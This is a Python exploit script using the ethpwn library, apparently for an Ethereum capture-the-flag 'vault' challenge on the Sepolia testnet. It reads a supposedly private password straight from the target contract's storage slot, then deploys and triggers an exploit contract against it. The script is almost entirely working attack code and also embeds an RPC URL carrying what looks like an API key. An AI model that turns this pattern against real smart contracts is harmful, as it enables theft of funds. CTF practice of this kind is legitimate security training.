#!/usr/bin/env python3

import sys
from ethpwn.ethlib.prelude import *

#!/usr/bin/env python3

from web3 import Web3
from time import sleep

from ethpwn import context
from ethpwn.contract_metadata import CONTRACT_METADATA
from ethpwn.transactions import transact

import argparse


parser = argparse.ArgumentParser()
parser.add_argument('proxy_addr', type=str)
parser.add_argument('--wallet', type=str, default='Laptop CTF Metamask', help="Wallet to use for the exploit transaction")
ARGS = parser.parse_args()

MY_WALLET = get_wallet(ARGS.wallet)
assert MY_WALLET is not None

context.log_level = 'DEBUG'

context.connect_http('https://eth-sepolia.g.alchemy.com/v2/CIlvNRJd1iqhTV5d_KIBxWX_qCq0j71v')
context.default_from_addr = MY_WALLET.address
context.default_signing_key = MY_WALLET.private_key

CONTRACT_METADATA.add_contracts_from_solidity_files(['./exploit_vault.sol'])

password = context.w3.eth.get_storage_at(ARGS.proxy_addr, 1)
print(password)

with CONTRACT_METADATA['Exploit'].deploy_destructible(ARGS.proxy_addr, password) as (tx_hash, target):
    print(f"Exploit contract is at {target.address}")
    sleep(2)

    transact(target.functions.exploit())
